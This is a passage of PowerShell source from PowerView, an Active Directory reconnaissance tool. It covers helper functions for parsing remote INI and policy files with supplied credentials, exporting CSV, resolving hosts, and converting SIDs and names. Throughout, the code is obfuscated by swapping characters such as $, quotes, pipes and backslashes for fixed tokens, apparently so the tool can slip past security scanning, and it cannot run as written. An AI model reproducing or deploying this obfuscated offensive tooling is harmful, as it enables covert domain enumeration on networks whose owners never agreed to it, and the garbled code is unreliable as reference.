                                if(!RaU_.Value.Equals((Get-Variable -Name RaU_.Key -ValueOnly -Scope 0))) {
                                    RaU_.Key
                                }
                            }
                            else {
                                # If object doesnq4gUt has Equals (e.g. RaUnull), fallback to the PowerShellq4gUs -ne operator
                                if(RaU_.Value -ne (Get-Variable -Name RaU_.Key -ValueOnly -Scope 0)) {
                                    RaU_.Key
                                }
                            }
                        }
            if(RaUStaleKeys) {
                RaUStaleKeys wZ5t ForEach-Object {[void]RaUPSBoundParameters.Remove(RaU_)}
            }

            # Since we rely solely on RaUPSBoundParameters, we donq4gUt have access to default values for unbound parameters
            RaUUnboundParameters = (Get-Command -Name (RaUPSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  wZ5t
                                        # Find parameters that are belong to the current parameter set
                                        Where-Object { RaU_.Value.ParameterSets.Keys -contains RaUPsCmdlet.ParameterSetName } wZ5t
                                            Select-Object -ExpandProperty Key wZ5t
                                                # Find unbound parameters in the current parameter set
                                                Where-Object { RaUPSBoundParameters.Keys -notcontains RaU_ }

            # Even if parameter is not bound, corresponding variable is created with parameterq4gUs default value (if specified)
            RaUtmp = RaUnull
            ForEach (RaUParameter in RaUUnboundParameters) {
                RaUDefaultValue = Get-Variable -Name RaUParameter -ValueOnly -Scope 0
                if(!RaUPSBoundParameters.TryGetValue(RaUParameter, [ref]RaUtmp) -and RaUDefaultValue) {
                    RaUPSBoundParameters.RaUParameter = RaUDefaultValue
                }
            }

            if(RaUDictionary) {
                RaUDPDictionary = RaUDictionary
            }
            else {
                RaUDPDictionary = RaUInternalDictionary
            }

            # Shortcut for getting local variables
            RaUGetVar = {Get-Variable -Name RaU_ -ValueOnly -Scope 0}

            # Strings to match attributes and validation arguments
            RaUAttributeRegex = q4gU^(MandatorywZ5tPositionwZ5tParameterSetNamewZ5tDontShowwZ5tHelpMessagewZ5tValueFromPipelinewZ5tValueFromPipelineByPropertyNamewZ5tValueFromRemainingArguments)RaUq4gU
            RaUValidationRegex = q4gU^(AllowNullwZ5tAllowEmptyStringwZ5tAllowEmptyCollectionwZ5tValidateCountwZ5tValidateLengthwZ5tValidatePatternwZ5tValidateRangewZ5tValidateScriptwZ5tValidateSetwZ5tValidateNotNullwZ5tValidateNotNullOrEmpty)RaUq4gU
            RaUAliasRegex = q4gU^AliasRaUq4gU
            RaUParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex (RaUPSBoundParameters.Keys) {
                RaUAttributeRegex {
                    Try {
                        RaUParameterAttribute.RaU_ = . RaUGetVar
                    }
                    Catch {
                        RaU_
                    }
                    continue
                }
            }

            if(RaUDPDictionary.Keys -contains RaUName) {
                RaUDPDictionary.RaUName.Attributes.Add(RaUParameterAttribute)
            }
            else {
                RaUAttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex (RaUPSBoundParameters.Keys) {
                    RaUValidationRegex {
                        Try {
                            RaUParameterOptions = New-Object -TypeName Oj8XSystem.Management.Automation.RaU{_}AttributeOj8X -ArgumentList (. RaUGetVar) -ErrorAction Stop
                            RaUAttributeCollection.Add(RaUParameterOptions)
                        }
                        Catch { RaU_ }
                        continue
                    }
                    RaUAliasRegex {
                        Try {
                            RaUParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. RaUGetVar) -ErrorAction Stop
                            RaUAttributeCollection.Add(RaUParameterAlias)
                            continue
                        }
                        Catch { RaU_ }
                    }
                }
                RaUAttributeCollection.Add(RaUParameterAttribute)
                RaUParameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @(RaUName, RaUType, RaUAttributeCollection)
                RaUDPDictionary.Add(RaUName, RaUParameter)
            }
        }
    }

    End {
        if(!RaUCreateVariables -and !RaUDictionary) {
            RaUDPDictionary
        }
    }
}


function Get-IniContent {
<#
.SYNOPSIS

This helper parses an .ini file into a hashtable.

Author: q4gUThe Scripting Guysq4gU
Modifications: @harmj0y (-Credential support)
License: BSD 3-Clause
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection

.DESCRIPTION

Parses an .ini file into a hashtable. If -Credential is supplied,
then Add-RemoteConnection is used to map ScKjScKjCOMPUTERNAMEScKjIPCRaU, the file
is parsed, and then the connection is destroyed with Remove-RemoteConnection.

.PARAMETER Path

Specifies the path to the .ini file to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-IniContent C:ScKjWindowsScKjexample.ini

.EXAMPLE

Oj8XC:ScKjWindowsScKjexample.iniOj8X wZ5t Get-IniContent -OutputObject

Outputs the .ini details as a proper nested PSObject.

.EXAMPLE

Oj8XC:ScKjWindowsScKjexample.iniOj8X wZ5t Get-IniContent

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-IniContent -Path ScKjScKjPRIMARY.testlab.localScKjCRaUScKjTempScKjGptTmpl.inf -Credential RaUCred

.INPUTS

String

Accepts one or more .ini paths on the pipeline.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed .ini file.

.LINK

https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUFullNameq4gU, q4gUNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaUOutputObject
    )

    BEGIN {
        RaUMappedComputers = @{}
    }

    PROCESS {
        ForEach (RaUTargetPath in RaUPath) {
            if ((RaUTargetPath -Match q4gUScKjScKjScKjScKj.*ScKjScKj.*q4gU) -and (RaUPSBoundParameters[q4gUCredentialq4gU])) {
                RaUHostComputer = (New-Object System.Uri(RaUTargetPath)).Host
                if (-not RaUMappedComputers[RaUHostComputer]) {
                    # map IPCRaU to this computer if itq4gUs not already
                    Add-RemoteConnection -ComputerName RaUHostComputer -Credential RaUCredential
                    RaUMappedComputers[RaUHostComputer] = RaUTrue
                }
            }

            if (Test-Path -Path RaUTargetPath) {
                if (RaUPSBoundParameters[q4gUOutputObjectq4gU]) {
                    RaUIniObject = New-Object PSObject
                }
                else {
                    RaUIniObject = @{}
                }
                Switch -Regex -File RaUTargetPath {
                    Oj8X^ScKj[(.+)ScKj]Oj8X # Section
                    {
                        RaUSection = RaUmatches[1].Trim()
                        if (RaUPSBoundParameters[q4gUOutputObjectq4gU]) {
                            RaUSection = RaUSection.Replace(q4gU q4gU, q4gUq4gU)
                            RaUSectionObject = New-Object PSObject
                            RaUIniObject wZ5t Add-Member Noteproperty RaUSection RaUSectionObject
                        }
                        else {
                            RaUIniObject[RaUSection] = @{}
                        }
                        RaUCommentCount = 0
                    }
                    Oj8X^(;.*)RaUOj8X # Comment
                    {
                        RaUValue = RaUmatches[1].Trim()
                        RaUCommentCount = RaUCommentCount + 1
                        RaUName = q4gUCommentq4gU + RaUCommentCount
                        if (RaUPSBoundParameters[q4gUOutputObjectq4gU]) {
                            RaUName = RaUName.Replace(q4gU q4gU, q4gUq4gU)
                            RaUIniObject.RaUSection wZ5t Add-Member Noteproperty RaUName RaUValue
                        }
                        else {
                            RaUIniObject[RaUSection][RaUName] = RaUValue
                        }
                    }
                    Oj8X(.+?)ScKjs*=(.*)Oj8X # Key
                    {
                        RaUName, RaUValue = RaUmatches[1..2]
                        RaUName = RaUName.Trim()
                        RaUValues = RaUValue.split(q4gU,q4gU) wZ5t ForEach-Object { RaU_.Trim() }

                        # if (RaUValues -isnot [System.Array]) { RaUValues = @(RaUValues) }

                        if (RaUPSBoundParameters[q4gUOutputObjectq4gU]) {
                            RaUName = RaUName.Replace(q4gU q4gU, q4gUq4gU)
                            RaUIniObject.RaUSection wZ5t Add-Member Noteproperty RaUName RaUValues
                        }
                        else {
                            RaUIniObject[RaUSection][RaUName] = RaUValues
                        }
                    }
                }
                RaUIniObject
            }
        }
    }

    END {
        # remove the IPCRaU mappings
        RaUMappedComputers.Keys wZ5t Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {
<#
.SYNOPSIS

Converts objects into a series of comma-separated (CSV) strings and saves the
strings in a CSV file in a thread-safe manner.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This helper exports an -InputObject to a .csv in a thread-safe manner
using a mutex. This is so the various multi-threaded functions in
PowerView has a thread-safe way to export output to the same file.
Uses .NET IO.FileStream/IO.StreamWriter objects for speed.

Originally based on Dmitry Sotnikovq4gUs Export-CSV code: http://poshcode.org/1590

.PARAMETER InputObject

Specifies the objects to export as CSV strings.

.PARAMETER Path

Specifies the path to the CSV output file.

.PARAMETER Delimiter

Specifies a delimiter to separate the property values. The default is a comma (,)

.PARAMETER Append

Indicates that this cmdlet adds the CSV output to the end of the specified file.
Without this parameter, Export-PowerViewCSV replaces the file contents without warning.

.EXAMPLE

Get-DomainUser wZ5t Export-PowerViewCSV -Path Oj8Xusers.csvOj8X

.EXAMPLE

Get-DomainUser wZ5t Export-PowerViewCSV -Path Oj8Xusers.csvOj8X -Append -Delimiter q4gUwZ5tq4gU

.INPUTS

PSObject

Accepts one or more PSObjects on the pipeline.

.LINK

http://poshcode.org/1590
http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [System.Management.Automation.PSObject[]]
        RaUInputObject,

        [Parameter(Mandatory = RaUTrue, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUPath,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        RaUDelimiter = q4gU,q4gU,

        [Switch]
        RaUAppend
    )

    BEGIN {
        RaUOutputPath = [IO.Path]::GetFullPath(RaUPSBoundParameters[q4gUPathq4gU])
        RaUExists = [System.IO.File]::Exists(RaUOutputPath)

        # mutex so threaded code doesnq4gUt stomp on the output file
        RaUMutex = New-Object System.Threading.Mutex RaUFalse,q4gUCSVMutexq4gU
        RaUNull = RaUMutex.WaitOne()

        if (RaUPSBoundParameters[q4gUAppendq4gU]) {
            RaUFileMode = [System.IO.FileMode]::Append
        }
        else {
            RaUFileMode = [System.IO.FileMode]::Create
            RaUExists = RaUFalse
        }

        RaUCSVStream = New-Object IO.FileStream(RaUOutputPath, RaUFileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        RaUCSVWriter = New-Object System.IO.StreamWriter(RaUCSVStream)
        RaUCSVWriter.AutoFlush = RaUTrue
    }

    PROCESS {
        ForEach (RaUEntry in RaUInputObject) {
            RaUObjectCSV = ConvertTo-Csv -InputObject RaUEntry -Delimiter RaUDelimiter -NoTypeInformation

            if (-not RaUExists) {
                # output the object field names as well
                RaUObjectCSV wZ5t ForEach-Object { RaUCSVWriter.WriteLine(RaU_) }
                RaUExists = RaUTrue
            }
            else {
                # only output object field data
                RaUObjectCSV[1..(RaUObjectCSV.Length-1)] wZ5t ForEach-Object { RaUCSVWriter.WriteLine(RaU_) }
            }
        }
    }

    END {
        RaUMutex.ReleaseMutex()
        RaUCSVWriter.Dispose()
        RaUCSVStream.Dispose()
    }
}


function Resolve-IPAddress {
<#
.SYNOPSIS

Resolves a given hostename to its associated IPv4 address.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Resolves a given hostename to its associated IPv4 address using
[Net.Dns]::GetHostEntry(). If no hostname is provided, the default
is the IP address of the localhost.

.EXAMPLE

Resolve-IPAddress -ComputerName SERVER

.EXAMPLE

@(Oj8XSERVER1Oj8X, Oj8XSERVER2Oj8X) wZ5t Resolve-IPAddress

.INPUTS

String

Accepts one or more IP address strings on the pipeline.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with the ComputerName and IPAddress.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.Management.Automation.PSCustomObjectq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = RaUEnv:COMPUTERNAME
    )

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry(RaUComputer)).AddressList) wZ5t ForEach-Object {
                    if (RaU_.AddressFamily -eq q4gUInterNetworkq4gU) {
                        RaUOut = New-Object PSObject
                        RaUOut wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                        RaUOut wZ5t Add-Member Noteproperty q4gUIPAddressq4gU RaU_.IPAddressToString
                        RaUOut
                    }
                }
            }
            catch {
                Write-Verbose Oj8X[Resolve-IPAddress] Could not resolve RaUComputer to an IP Address.Oj8X
            }
        }
    }
}


function ConvertTo-SID {
<#
.SYNOPSIS

Converts a given user/group name to a security identifier (SID).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  

.DESCRIPTION

Converts a Oj8XDOMAINScKjusernameOj8X syntax to a security identifier (SID)
using System.Security.Principal.NTAccountq4gUs translate function. If alternate
credentials are supplied, then Get-ADObject is used to try to map the name
to a security identifier.

.PARAMETER ObjectName

The user/group name to convert, can be q4gUuserq4gU or q4gUDOMAINScKjuserq4gU format.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertTo-SID q4gUDEVScKjdfmq4gU

.EXAMPLE

q4gUDEVScKjdfmq4gU,q4gUDEVScKjkrbtgtq4gU wZ5t ConvertTo-SID

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
q4gUTESTLABScKjdfmq4gU wZ5t ConvertTo-SID -Credential RaUCred

.INPUTS

String

Accepts one or more username specification strings on the pipeline.

.OUTPUTS

String

A string representing the SID of the translated name.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU, q4gUIdentityq4gU)]
        [String[]]
        RaUObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUDomainSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUDomainSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUDomainSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUDomainSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        ForEach (RaUObject in RaUObjectName) {
            RaUObject = RaUObject -Replace q4gU/q4gU,q4gUScKjq4gU

            if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                RaUDN = Convert-ADName -Identity RaUObject -OutputType q4gUDNq4gU @DomainSearcherArguments
                if (RaUDN) {
                    RaUUserDomain = RaUDN.SubString(RaUDN.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                    RaUUserName = RaUDN.Split(q4gU,q4gU)[0].split(q4gU=q4gU)[1]

                    RaUDomainSearcherArguments[q4gUIdentityq4gU] = RaUUserName
                    RaUDomainSearcherArguments[q4gUDomainq4gU] = RaUUserDomain
                    RaUDomainSearcherArguments[q4gUPropertiesq4gU] = q4gUobjectsidq4gU
                    Get-DomainObject @DomainSearcherArguments wZ5t Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if (RaUObject.Contains(q4gUScKjq4gU)) {
                        RaUDomain = RaUObject.Split(q4gUScKjq4gU)[0]
                        RaUObject = RaUObject.Split(q4gUScKjq4gU)[1]
                    }
                    elseif (-not RaUPSBoundParameters[q4gUDomainq4gU]) {
                        RaUDomainSearcherArguments = @{}
                        RaUDomain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    RaUObj = (New-Object System.Security.Principal.NTAccount(RaUDomain, RaUObject))
                    RaUObj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose Oj8X[ConvertTo-SID] Error converting RaUDomainScKjRaUObject : RaU_Oj8X
                }
            }
        }
    }
}


function ConvertFrom-SID {
<#
.SYNOPSIS

Converts a security identifier (SID) to a group/user name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName  

.DESCRIPTION

Converts a security identifier string (SID) to a group/user name
using Convert-ADName.

.PARAMETER ObjectSid

Specifies one or more SIDs to convert.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

TESTLABScKjharmj0y

.EXAMPLE

Oj8XS-1-5-21-890171859-3433809279-3366196753-1107Oj8X, Oj8XS-1-5-21-890171859-3433809279-3366196753-1108Oj8X, Oj8XS-1-5-32-562Oj8X wZ5t ConvertFrom-SID

TESTLABScKjWINDOWS2RaU
TESTLABScKjharmj0y
BUILTINScKjDistributed COM Users

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfmq4gU, RaUSecPassword)
ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential RaUCred

TESTLABScKjharmj0y

.INPUTS

String

Accepts one or more SID strings on the pipeline.

.OUTPUTS

String

The converted DOMAINScKjusername.
#>

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUSIDq4gU)]
        [ValidatePattern(q4gU^S-1-.*q4gU)]
        [String[]]
        RaUObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUADNameArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUADNameArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUADNameArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUADNameArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        ForEach (RaUTargetSid in RaUObjectSid) {
            RaUTargetSid = RaUTargetSid.trim(q4gU*q4gU)
            try {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch (RaUTargetSid) {
                    q4gUS-1-0q4gU         { q4gUNull Authorityq4gU }
                    q4gUS-1-0-0q4gU       { q4gUNobodyq4gU }
                    q4gUS-1-1q4gU         { q4gUWorld Authorityq4gU }
                    q4gUS-1-1-0q4gU       { q4gUEveryoneq4gU }
                    q4gUS-1-2q4gU         { q4gULocal Authorityq4gU }
                    q4gUS-1-2-0q4gU       { q4gULocalq4gU }
                    q4gUS-1-2-1q4gU       { q4gUConsole Logon q4gU }
                    q4gUS-1-3q4gU         { q4gUCreator Authorityq4gU }
                    q4gUS-1-3-0q4gU       { q4gUCreator Ownerq4gU }
                    q4gUS-1-3-1q4gU       { q4gUCreator Groupq4gU }
                    q4gUS-1-3-2q4gU       { q4gUCreator Owner Serverq4gU }
                    q4gUS-1-3-3q4gU       { q4gUCreator Group Serverq4gU }
                    q4gUS-1-3-4q4gU       { q4gUOwner Rightsq4gU }
                    q4gUS-1-4q4gU         { q4gUNon-unique Authorityq4gU }
                    q4gUS-1-5q4gU         { q4gUNT Authorityq4gU }
                    q4gUS-1-5-1q4gU       { q4gUDialupq4gU }
                    q4gUS-1-5-2q4gU       { q4gUNetworkq4gU }
                    q4gUS-1-5-3q4gU       { q4gUBatchq4gU }
                    q4gUS-1-5-4q4gU       { q4gUInteractiveq4gU }
                    q4gUS-1-5-6q4gU       { q4gUServiceq4gU }
                    q4gUS-1-5-7q4gU       { q4gUAnonymousq4gU }
                    q4gUS-1-5-8q4gU       { q4gUProxyq4gU }
                    q4gUS-1-5-9q4gU       { q4gUEnterprise Domain Controllersq4gU }
                    q4gUS-1-5-10q4gU      { q4gUPrincipal Selfq4gU }
                    q4gUS-1-5-11q4gU      { q4gUAuthenticated Usersq4gU }
                    q4gUS-1-5-12q4gU      { q4gURestricted Codeq4gU }
                    q4gUS-1-5-13q4gU      { q4gUTerminal Server Usersq4gU }
                    q4gUS-1-5-14q4gU      { q4gURemote Interactive Logonq4gU }
                    q4gUS-1-5-15q4gU      { q4gUThis Organization q4gU }
                    q4gUS-1-5-17q4gU      { q4gUThis Organization q4gU }
                    q4gUS-1-5-18q4gU      { q4gULocal Systemq4gU }
                    q4gUS-1-5-19q4gU      { q4gUNT Authorityq4gU }
                    q4gUS-1-5-20q4gU      { q4gUNT Authorityq4gU }
                    q4gUS-1-5-80-0q4gU    { q4gUAll Services q4gU }
                    q4gUS-1-5-32-544q4gU  { q4gUBUILTINScKjAdministratorsq4gU }
                    q4gUS-1-5-32-545q4gU  { q4gUBUILTINScKjUsersq4gU }
                    q4gUS-1-5-32-546q4gU  { q4gUBUILTINScKjGuestsq4gU }
                    q4gUS-1-5-32-547q4gU  { q4gUBUILTINScKjPower Usersq4gU }
                    q4gUS-1-5-32-548q4gU  { q4gUBUILTINScKjAccount Operatorsq4gU }
                    q4gUS-1-5-32-549q4gU  { q4gUBUILTINScKjServer Operatorsq4gU }
                    q4gUS-1-5-32-550q4gU  { q4gUBUILTINScKjPrint Operatorsq4gU }
                    q4gUS-1-5-32-551q4gU  { q4gUBUILTINScKjBackup Operatorsq4gU }
                    q4gUS-1-5-32-552q4gU  { q4gUBUILTINScKjReplicatorsq4gU }
                    q4gUS-1-5-32-554q4gU  { q4gUBUILTINScKjPre-Windows 2000 Compatible Accessq4gU }
                    q4gUS-1-5-32-555q4gU  { q4gUBUILTINScKjRemote Desktop Usersq4gU }
                    q4gUS-1-5-32-556q4gU  { q4gUBUILTINScKjNetwork Configuration Operatorsq4gU }
                    q4gUS-1-5-32-557q4gU  { q4gUBUILTINScKjIncoming Forest Trust Buildersq4gU }
                    q4gUS-1-5-32-558q4gU  { q4gUBUILTINScKjPerformance Monitor Usersq4gU }
                    q4gUS-1-5-32-559q4gU  { q4gUBUILTINScKjPerformance Log Usersq4gU }
                    q4gUS-1-5-32-560q4gU  { q4gUBUILTINScKjWindows Authorization Access Groupq4gU }
                    q4gUS-1-5-32-561q4gU  { q4gUBUILTINScKjTerminal Server License Serversq4gU }
                    q4gUS-1-5-32-562q4gU  { q4gUBUILTINScKjDistributed COM Usersq4gU }
                    q4gUS-1-5-32-569q4gU  { q4gUBUILTINScKjCryptographic Operatorsq4gU }
                    q4gUS-1-5-32-573q4gU  { q4gUBUILTINScKjEvent Log Readersq4gU }
                    q4gUS-1-5-32-574q4gU  { q4gUBUILTINScKjCertificate Service DCOM Accessq4gU }
                    q4gUS-1-5-32-575q4gU  { q4gUBUILTINScKjRDS Remote Access Serversq4gU }
                    q4gUS-1-5-32-576q4gU  { q4gUBUILTINScKjRDS Endpoint Serversq4gU }
                    q4gUS-1-5-32-577q4gU  { q4gUBUILTINScKjRDS Management Serversq4gU }
                    q4gUS-1-5-32-578q4gU  { q4gUBUILTINScKjHyper-V Administratorsq4gU }
                    q4gUS-1-5-32-579q4gU  { q4gUBUILTINScKjAccess Control Assistance Operatorsq4gU }
                    q4gUS-1-5-32-580q4gU  { q4gUBUILTINScKjAccess Control Assistance Operatorsq4gU }
                    Default {
                        Convert-ADName -Identity RaUTargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose Oj8X[ConvertFrom-SID] Error converting SID q4gURaUTargetSidq4gU : RaU_Oj8X
            }
        }
    }
}


function Convert-ADName {
<#
.SYNOPSIS

Converts Active Directory object names between a variety of formats.

Author: Bill Stewart, Pasquale Lantella  
Modifications: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function is heavily based on Bill Stewartq4gUs code and Pasquale Lantellaq4gUs code (in LINK)
and translates Active Directory names between various formats using the NameTranslate COM object.

.PARAMETER Identity

Specifies the Active Directory object name to translate, of the following form:

    DN                short for q4gUdistinguished nameq4gU; e.g., q4gUCN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=comq4gU
    Canonical         canonical name; e.g., q4gUfabrikam.com/Engineers/Phineas Flynnq4gU
    NT4               domainScKjusername; e.g., q4gUfabrikamScKjpflynnq4gU
    Display           display name, e.g. q4gUpflynnq4gU
    DomainSimple      simple domain name format, e.g. q4gUpflynn@fabrikam.comq4gU
    EnterpriseSimple  simple enterprise name format, e.g. q4gUpflynn@fabrikam.comq4gU
    GUID              GUID; e.g., q4gU{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}q4gU
    UPN               user principal name; e.g., q4gUpflynn@fabrikam.comq4gU
    CanonicalEx       extended canonical name format
    SPN               service principal name format; e.g. q4gUHTTP/kairomac.contoso.comq4gU
    SID               Security Identifier; e.g., q4gUS-1-5-21-12986231-600641547-709122288-57999q4gU

.PARAMETER OutputType

Specifies the output name type you want to convert to, which must be one of the following:

    DN                short for q4gUdistinguished nameq4gU; e.g., q4gUCN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=comq4gU
    Canonical         canonical name; e.g., q4gUfabrikam.com/Engineers/Phineas Flynnq4gU
    NT4               domainScKjusername; e.g., q4gUfabrikamScKjpflynnq4gU
    Display           display name, e.g. q4gUpflynnq4gU
    DomainSimple      simple domain name format, e.g. q4gUpflynn@fabrikam.comq4gU
    EnterpriseSimple  simple enterprise name format, e.g. q4gUpflynn@fabrikam.comq4gU
    GUID              GUID; e.g., q4gU{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}q4gU
    UPN               user principal name; e.g., q4gUpflynn@fabrikam.comq4gU
    CanonicalEx       extended canonical name format, e.g. q4gUfabrikam.com/Users/Phineas Flynnq4gU
    SPN               service principal name format; e.g. q4gUHTTP/kairomac.contoso.comq4gU

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

Convert-ADName -Identity Oj8XTESTLABScKjharmj0yOj8X

harmj0y@testlab.local

.EXAMPLE

Oj8XTESTLABScKjkrbtgtOj8X, Oj8XCN=Administrator,CN=Users,DC=testlab,DC=localOj8X wZ5t Convert-ADName -OutputType Canonical

testlab.local/Users/krbtgt
testlab.local/Users/Administrator

.EXAMPLE

Convert-ADName -OutputType dn -Identity q4gUTESTLABScKjharmj0yq4gU -Server PRIMARY.testlab.local

CN=harmj0y,CN=Users,DC=testlab,DC=local

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfmq4gU, RaUSecPassword)
q4gUS-1-5-21-890171859-3433809279-3366196753-1108q4gU wZ5t Convert-ADNAme -Credential RaUCred

TESTLABScKjharmj0y

.INPUTS

String

Accepts one or more objects name strings on the pipeline.

.OUTPUTS

String

Outputs a string representing the converted name.

.LINK

http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU, q4gUObjectNameq4gU)]
        [String[]]
        RaUIdentity,

